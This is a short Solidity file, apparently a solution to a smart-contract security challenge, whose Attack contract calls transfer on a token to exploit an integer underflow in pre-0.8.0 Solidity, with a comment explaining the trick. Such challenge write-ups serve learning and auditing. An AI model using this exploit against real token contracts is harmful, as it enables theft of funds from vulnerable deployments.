// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Token } from './Token.sol';

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
}

contract Attack {
    IToken public token;

    constructor(address _token) {
        token = IToken(_token);
    }

    /*
    I don't want to change up the solidity version to below 0.8.0 because I'm lazy
    The issue here is that in version 0.6.0, the solidity compiler doesn't check for underflow
    In the first line, we are making sure that our balance of tokens minus our value argument is
    greater than or equal to 0. Because of underflows in version 0.6.0 of Solidity we are able to
    to pass this check and transfer more tokens than we have by subtracting the balance of user tokens.
    */

    function attack() public {
        token.transfer(msg.sender, 21);
    }
}